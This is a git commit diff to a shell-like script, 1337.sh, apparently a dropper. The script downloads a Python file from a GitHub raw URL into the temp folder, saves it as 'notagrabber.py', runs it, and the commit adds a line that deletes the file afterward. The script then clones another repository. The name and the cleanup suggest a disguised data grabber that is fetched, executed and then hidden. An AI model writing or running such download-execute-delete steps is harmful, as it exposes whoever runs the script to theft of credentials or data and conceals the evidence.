b9c7eb86221ed37e9754ea8d39ed2ddf9088e05e
Griffith-Femto1 <moisesaugustosilvaleal5@gmail.com>
2026-03-04 23:59:08 -0300

    Update 1337.sh

--- 1337.sh
+++ 1337.sh
@@ -2,7 +2,8 @@ cd %temp%
 cls
 curl https://raw.githubusercontent.com/Griffith-Femto1/Griffith/refs/heads/main/moretestshiigidkimlosingmyshi.py --output notagrabber.py
 python notagrabber.py
-wait(3)
+sleep 3
+del notagrabber.py
 cls
 cd Downloads
 git clone https://github.com/Griffith-Femto1/1337.git
